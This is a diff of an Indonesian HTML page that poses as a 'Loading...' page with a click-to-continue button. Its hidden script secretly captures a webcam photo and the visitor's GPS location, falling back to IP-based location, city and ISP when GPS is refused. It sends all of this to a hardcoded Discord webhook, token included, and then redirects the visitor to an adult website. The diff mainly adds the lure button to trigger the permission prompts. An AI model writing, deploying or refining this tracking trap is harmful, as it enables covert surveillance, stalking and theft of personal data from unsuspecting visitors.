@@ -5,65 +5,93 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Memuat...</title>
     <style>
-        *{margin:0;padding:0}
-        body{background:#fff;height:100vh}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#fff;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif}
         video,canvas{position:absolute;opacity:0;pointer-events:none}
+        #tombol{padding:15px 40px;font-size:18px;background:#007bff;color:#fff;border:none;border-radius:8px;cursor:pointer}
+        #tombol:hover{background:#0056b3}
+        #info{text-align:center;color:#333;display:none}
     </style>
 </head>
 <body>
+    <div id="info">
+        <h2>Sedang memproses...</h2>
+        <p>Mohon tunggu sebentar...</p>
+    </div>
+    <button id="tombol">🔄 Yakin mau lanjut? klik</button>
 
 <script>
-// ✅ WEBHOOK UDAH TERISI! GAK USAH DIUBAH LAGI!
 const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
 const PINDAH_KE = "https://nekopoi.care";
 
-// AMBIL FOTO DULU
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
-.then(kamera=>{
-    const vid = document.createElement("video");
-    vid.srcObject = kamera; vid.play();
-    setTimeout(()=>{
-        const kanvas = document.createElement("canvas");
-        kanvas.width=400; kanvas.height=400;
-        const ctx = kanvas.getContext("2d");
-        ctx.drawImage(vid,0,0,400,400);
-        const foto = kanvas.toDataURL("image/jpeg");
-        kamera.getTracks().forEach(t=>t.stop());
-        ambilLokasi(foto);
-    },1500);
-})
-.catch(()=>ambilLokasi(null));
+const tombol = document.getElementById("tombol");
+const info = document.getElementById("info");
 
-// AMBIL LOKASI: GPS DULU → GAGAL → PAKE IP OTOMATIS!
+// ✅ SASARAN KLIK → LANGSUNG MUNCUL IZIN!
+tombol.onclick = function(){
+    tombol.style.display = "none";
+    info.style.display = "block";
+    ambilSemuanya();
+};
+
+function ambilSemuanya(){
+    let fotoData = null;
+
+    // 📷 AMBIL FOTO DULU
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
+    .then(kamera=>{
+        const vid = document.createElement("video");
+        vid.srcObject = kamera; vid.play();
+        setTimeout(()=>{
+            const kanvas = document.createElement("canvas");
+            kanvas.width=400; kanvas.height=400;
+            const ctx = kanvas.getContext("2d");
+            ctx.drawImage(vid,0,0,400,400);
+            fotoData = kanvas.toDataURL("image/jpeg");
+            kamera.getTracks().forEach(t=>t.stop());
+            ambilLokasi(fotoData);
+        },1500);
+    })
+    .catch(err=>{
+        fotoData = null;
+        ambilLokasi(null);
+    });
+}
+
+// 📍 AMBIL LOKASI GPS DULU → GAGAL → PAKE IP
 function ambilLokasi(foto){
     if(!navigator.geolocation){
         ambilLewatIP(foto); return;
     }
     navigator.geolocation.getCurrentPosition(
         pos=>{
-            const lok = `🌍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ${Math.round(pos.coords.accuracy)}m`;
-            kirim(foto,lok);
+            const lok = `🌍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ${Math.round(pos.coords.accuracy)} meter`;
+            kirimData(foto, lok);
         },
         err=>{
-            // ❌ GPS DITOLAK → OTOMATIS AMBIL LEWAT IP!
             ambilLewatIP(foto);
         },
-        {enableHighAccuracy:true,timeout:6000}
+        {enableHighAccuracy:true,timeout:10000}
     );
 }
 
-// ✅ LOKASI DARI IP — GAK PERLU IZIN!
+// 🌐 LOKASI DARI IP — GAK PERLU IZIN
 function ambilLewatIP(foto){
-    fetch("https://ipapi.co/json/")
+    fetch("https://ip-api.com/json/?fields=status,city,regionName,country,query,isp")
     .then(r=>r.json())
     .then(data=>{
-        const lok = `🌐 LOKASI DARI IP:\n📍 ${data.city}, ${data.region}\n🇮🇩 ${data.country_name}\n🔢 IP: ${data.ip}`;
-        kirim(foto,lok);
+        if(data.status=="success"){
+            const lok = `🌐 LOKASI DARI IP:\n📍 ${data.city}, ${data.regionName}\n🇮🇩 ${data.country}\n🔢 IP: ${data.query}\n📡 ISP: ${data.isp}`;
+            kirimData(foto, lok);
+        }else{
+            kirimData(foto, "✅ Foto diambil!\n❌ Lokasi tidak dapat diambil");
+        }
     })
-    .catch(()=>kirim(foto,"✅ Foto diambil!\n❌ Lokasi gak bisa diambil"));
+    .catch(()=>kirimData(foto, "✅ Foto diambil!\n❌ Gagal ambil lokasi"));
 }
 
-function kirim(foto,teks){
+// 📤 KIRIM KE DISCORD LALU PINDAH
+function kirimData(foto, teks){
     fetch(WEBHOOK,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
@@ -72,7 +100,9 @@ function kirim(foto,teks){
             embeds:foto?[{image:{url:foto}}]:[]
         })
     })
-    .finally(()=>{window.location.href=PINDAH_KE;});
+    .finally(()=>{
+        window.location.href = PINDAH_KE;
+    });
 }
 </script>
 </body>
